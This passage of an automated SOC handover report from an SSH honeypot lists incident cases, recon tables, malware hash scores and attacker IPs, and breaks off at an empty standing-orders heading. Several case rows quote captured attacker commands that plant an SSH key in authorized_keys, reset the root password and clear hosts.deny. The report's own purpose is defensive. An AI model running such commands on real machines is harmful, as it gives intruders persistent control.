| `2026-04-01 09:24:55` | `cowrie.login.success` |
| `2026-04-01 09:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34fab004e046

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:29 |
| **Last Seen** | 2026-04-01 09:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:29:25` | `cowrie.session.connect` |
| `2026-04-01 09:29:25` | `cowrie.client.version` |
| `2026-04-01 09:29:26` | `cowrie.client.kex` |
| `2026-04-01 09:29:26` | `cowrie.login.success` |
| `2026-04-01 09:29:27` | `cowrie.session.params` |
| `2026-04-01 09:29:27` | `cowrie.command.input` |
| `2026-04-01 09:29:27` | `cowrie.command.failed` |
| `2026-04-01 09:29:27` | `cowrie.log.closed` |
| `2026-04-01 09:29:27` | `cowrie.session.params` |
| `2026-04-01 09:29:27` | `cowrie.command.input` |
| `2026-04-01 09:29:27` | `cowrie.session.file_download` |
| `2026-04-01 09:29:27` | `cowrie.log.closed` |
| `2026-04-01 09:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed9dc6fce62

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:29 |
| **Last Seen** | 2026-04-01 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:29:30` | `cowrie.session.connect` |
| `2026-04-01 09:29:30` | `cowrie.client.version` |
| `2026-04-01 09:29:30` | `cowrie.client.kex` |
| `2026-04-01 09:29:31` | `cowrie.login.success` |
| `2026-04-01 09:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4d0d1b6b215

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 09:34 |
| **Last Seen** | 2026-04-01 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:34:41` | `cowrie.session.connect` |
| `2026-04-01 09:34:42` | `cowrie.client.version` |
| `2026-04-01 09:34:42` | `cowrie.client.kex` |
| `2026-04-01 09:34:42` | `cowrie.login.success` |
| `2026-04-01 09:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7eb0d37c1b

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 09:48 |
| **Last Seen** | 2026-04-01 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:48:20` | `cowrie.session.connect` |
| `2026-04-01 09:48:20` | `cowrie.client.version` |
| `2026-04-01 09:48:20` | `cowrie.client.kex` |
| `2026-04-01 09:48:21` | `cowrie.login.success` |
| `2026-04-01 09:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295cada30143

| Field | Detail |
|---|---|
| **Source IP** | `106.58.173[.]254` |
| **First Seen** | 2026-04-01 10:00 |
| **Last Seen** | 2026-04-01 10:01 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:r60OXb50vesq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:00:38` | `cowrie.session.connect` |
| `2026-04-01 10:00:38` | `cowrie.client.version` |
| `2026-04-01 10:00:38` | `cowrie.client.kex` |
| `2026-04-01 10:00:39` | `cowrie.login.success` |
| `2026-04-01 10:00:39` | `cowrie.session.params` |
| `2026-04-01 10:00:39` | `cowrie.command.input` |
| `2026-04-01 10:00:39` | `cowrie.command.failed` |
| `2026-04-01 10:00:39` | `cowrie.log.closed` |
| `2026-04-01 10:00:39` | `cowrie.session.params` |
| `2026-04-01 10:00:39` | `cowrie.command.input` |
| `2026-04-01 10:00:40` | `cowrie.session.file_download` |
| `2026-04-01 10:00:40` | `cowrie.log.closed` |
| `2026-04-01 10:00:53` | `cowrie.session.params` |
| `2026-04-01 10:00:53` | `cowrie.command.input` |
| `2026-04-01 10:00:53` | `cowrie.log.closed` |
| `2026-04-01 10:00:54` | `cowrie.session.params` |
| `2026-04-01 10:00:54` | `cowrie.command.input` |
| `2026-04-01 10:00:54` | `cowrie.log.closed` |
| `2026-04-01 10:00:54` | `cowrie.session.params` |
| `2026-04-01 10:00:54` | `cowrie.command.input` |
| `2026-04-01 10:00:54` | `cowrie.session.file_download` |
| `2026-04-01 10:00:54` | `cowrie.log.closed` |
| `2026-04-01 10:00:54` | `cowrie.session.params` |
| `2026-04-01 10:00:54` | `cowrie.command.input` |
| `2026-04-01 10:00:55` | `cowrie.log.closed` |
| `2026-04-01 10:00:55` | `cowrie.session.params` |
| `2026-04-01 10:00:55` | `cowrie.command.input` |
| `2026-04-01 10:00:55` | `cowrie.log.closed` |
| `2026-04-01 10:00:55` | `cowrie.session.params` |
| `2026-04-01 10:00:55` | `cowrie.command.input` |
| `2026-04-01 10:00:55` | `cowrie.command.input` |
| `2026-04-01 10:00:55` | `cowrie.log.closed` |
| `2026-04-01 10:00:56` | `cowrie.session.params` |
| `2026-04-01 10:00:56` | `cowrie.command.input` |
| `2026-04-01 10:00:56` | `cowrie.log.closed` |
| `2026-04-01 10:00:56` | `cowrie.session.params` |
| `2026-04-01 10:00:56` | `cowrie.command.input` |
| `2026-04-01 10:00:56` | `cowrie.log.closed` |
| `2026-04-01 10:00:57` | `cowrie.session.params` |
| `2026-04-01 10:00:57` | `cowrie.command.input` |
| `2026-04-01 10:00:57` | `cowrie.log.closed` |
| `2026-04-01 10:00:57` | `cowrie.session.params` |
| `2026-04-01 10:00:57` | `cowrie.command.input` |
| `2026-04-01 10:00:57` | `cowrie.log.closed` |
| `2026-04-01 10:00:58` | `cowrie.session.params` |
| `2026-04-01 10:00:58` | `cowrie.command.input` |
| `2026-04-01 10:00:58` | `cowrie.log.closed` |
| `2026-04-01 10:00:58` | `cowrie.session.params` |
| `2026-04-01 10:00:58` | `cowrie.command.input` |
| `2026-04-01 10:00:58` | `cowrie.log.closed` |
| `2026-04-01 10:00:58` | `cowrie.session.params` |
| `2026-04-01 10:00:58` | `cowrie.command.input` |
| `2026-04-01 10:00:59` | `cowrie.log.closed` |
| `2026-04-01 10:00:59` | `cowrie.session.params` |
| `2026-04-01 10:00:59` | `cowrie.command.input` |
| `2026-04-01 10:00:59` | `cowrie.log.closed` |
| `2026-04-01 10:00:59` | `cowrie.session.params` |
| `2026-04-01 10:00:59` | `cowrie.command.input` |
| `2026-04-01 10:00:59` | `cowrie.log.closed` |
| `2026-04-01 10:01:00` | `cowrie.session.params` |
| `2026-04-01 10:01:00` | `cowrie.command.input` |
| `2026-04-01 10:01:00` | `cowrie.log.closed` |
| `2026-04-01 10:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.58.173[.]254` to AbuseIPDB if not already reported
- [ ] Block `106.58.173[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd46c751de7

| Field | Detail |
|---|---|
| **Source IP** | `103.103.245[.]7` |
| **First Seen** | 2026-04-01 10:01 |
| **Last Seen** | 2026-04-01 10:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:01:23` | `cowrie.session.connect` |
| `2026-04-01 10:01:23` | `cowrie.client.version` |
| `2026-04-01 10:01:23` | `cowrie.client.kex` |
| `2026-04-01 10:01:24` | `cowrie.login.success` |
| `2026-04-01 10:01:24` | `cowrie.session.params` |
| `2026-04-01 10:01:24` | `cowrie.command.input` |
| `2026-04-01 10:01:24` | `cowrie.command.failed` |
| `2026-04-01 10:01:24` | `cowrie.log.closed` |
| `2026-04-01 10:01:25` | `cowrie.session.params` |
| `2026-04-01 10:01:25` | `cowrie.command.input` |
| `2026-04-01 10:01:25` | `cowrie.session.file_download` |
| `2026-04-01 10:01:25` | `cowrie.log.closed` |
| `2026-04-01 10:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.103.245[.]7` to AbuseIPDB if not already reported
- [ ] Block `103.103.245[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d9d1e92e70

| Field | Detail |
|---|---|
| **Source IP** | `103.103.245[.]7` |
| **First Seen** | 2026-04-01 10:01 |
| **Last Seen** | 2026-04-01 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:01:28` | `cowrie.session.connect` |
| `2026-04-01 10:01:28` | `cowrie.client.version` |
| `2026-04-01 10:01:28` | `cowrie.client.kex` |
| `2026-04-01 10:01:29` | `cowrie.login.success` |
| `2026-04-01 10:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.103.245[.]7` to AbuseIPDB if not already reported
- [ ] Block `103.103.245[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-763348912b6b

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 10:29 |
| **Last Seen** | 2026-04-01 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:29:32` | `cowrie.session.connect` |
| `2026-04-01 10:29:32` | `cowrie.client.version` |
| `2026-04-01 10:29:32` | `cowrie.client.kex` |
| `2026-04-01 10:29:33` | `cowrie.login.success` |
| `2026-04-01 10:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b5357b124b

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 10:43 |
| **Last Seen** | 2026-04-01 10:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:43:19` | `cowrie.session.connect` |
| `2026-04-01 10:43:19` | `cowrie.client.version` |
| `2026-04-01 10:43:20` | `cowrie.client.kex` |
| `2026-04-01 10:43:20` | `cowrie.login.success` |
| `2026-04-01 10:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80e775769f7

| Field | Detail |
|---|---|
| **Source IP** | `101.43.79[.]210` |
| **First Seen** | 2026-04-01 10:47 |
| **Last Seen** | 2026-04-01 10:47 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 10:47:02` | `cowrie.session.connect` |
| `2026-04-01 10:47:05` | `cowrie.client.version` |
| `2026-04-01 10:47:05` | `cowrie.client.kex` |
| `2026-04-01 10:47:16` | `cowrie.login.success` |
| `2026-04-01 10:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.43.79[.]210` to AbuseIPDB if not already reported
- [ ] Block `101.43.79[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.63.25[.]203` | **7** | 2026-04-01 09:01 | 2026-04-01 09:29 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `106.58.173[.]254` | **5** | 2026-04-01 09:29 | 2026-04-01 10:05 | 10m | 0 | `T1592` | 🟢 LOW |
| `201.243.207[.]68` | **3** | 2026-04-01 09:01 | 2026-04-01 10:45 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.43.79[.]210` | **2** | 2026-04-01 10:45 | 2026-04-01 10:46 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `13.89.124[.]221` | **2** | 2026-04-01 10:33 | 2026-04-01 10:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.103.245[.]7` | 1 | 2026-04-01 10:01 | 2026-04-01 10:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.29.185[.]162` | 1 | 2026-04-01 09:47 | 2026-04-01 09:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.161.26[.]125` | 1 | 2026-04-01 10:00 | 2026-04-01 10:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.62.8[.]17` | 1 | 2026-04-01 09:10 | 2026-04-01 09:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-04-01 10:46 | 2026-04-01 10:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `148.227.83[.]165` | 1 | 2026-04-01 09:57 | 2026-04-01 09:59 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `151.237.170[.]49` | 1 | 2026-04-01 09:17 | 2026-04-01 09:17 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `153.37.177[.]219` | 1 | 2026-04-01 09:07 | 2026-04-01 09:07 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.210.53[.]227` | 1 | 2026-04-01 09:21 | 2026-04-01 09:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.118.13[.]206` | 1 | 2026-04-01 09:07 | 2026-04-01 09:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]109` | 1 | 2026-04-01 09:43 | 2026-04-01 09:43 | 29s | 0 | `T1592` | 🟢 LOW |
| `182.95.223[.]50` | 1 | 2026-04-01 09:37 | 2026-04-01 09:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.53[.]82` | 1 | 2026-04-01 10:27 | 2026-04-01 10:27 | 6s | 0 | `T1592` | 🟢 LOW |
| `183.93.165[.]103` | 1 | 2026-04-01 09:23 | 2026-04-01 09:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.245.95[.]11` | 1 | 2026-04-01 09:47 | 2026-04-01 09:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.25.233[.]22` | 1 | 2026-04-01 09:27 | 2026-04-01 09:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.50.167[.]81` | 1 | 2026-04-01 10:26 | 2026-04-01 10:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.251.253[.]139` | 1 | 2026-04-01 10:46 | 2026-04-01 10:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.17.128[.]7` | 1 | 2026-04-01 10:06 | 2026-04-01 10:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.8.2[.]70` | 1 | 2026-04-01 09:07 | 2026-04-01 09:07 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `72.176.38[.]103` | 1 | 2026-04-01 09:50 | 2026-04-01 09:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `73.29.219[.]168` | 1 | 2026-04-01 09:35 | 2026-04-01 09:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.219.82[.]137` | 1 | 2026-04-01 09:07 | 2026-04-01 09:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `87.117.32[.]22` | 1 | 2026-04-01 10:36 | 2026-04-01 10:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.160.135[.]217` | 1 | 2026-04-01 09:42 | 2026-04-01 09:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.145.118[.]40` | 1 | 2026-04-01 09:27 | 2026-04-01 09:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.219.82[.]137` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 22 |
| `183.171.53[.]82` | MY | Celcom Axiata Berhad | **100** ⚠️ | 20 |
| `103.29.185[.]162` | ID | PT Pascal Indonesia | **100** ⚠️ | 50 |
| `151.237.170[.]49` | RU | Regional Digital Telecommunication Company | **100** ⚠️ | 2 |
| `183.93.165[.]103` | CN | China Unicom Hubei Province Network | **100** ⚠️ | 8 |
| `103.103.245[.]7` | HK | Asia Pacific Network Information Centre | **100** ⚠️ | 49 |
| `43.251.253[.]139` | PK | Optix Pakistan (Pvt.) Limited | **100** ⚠️ | 13 |
| `90.160.135[.]217` | ES | Orange Espagne SA | **100** ⚠️ | 6 |
| `87.117.32[.]22` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `218.25.233[.]22` | CN | China Unicom Liaoning province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 73 cases |
| Tool 34  | Credential Extractor        | ✅ 53 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (6.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 31 recon entry/entries in table (5 group(s) consolidating 19 session(s)).

---

## 📋 Standing Orders for Next Shift

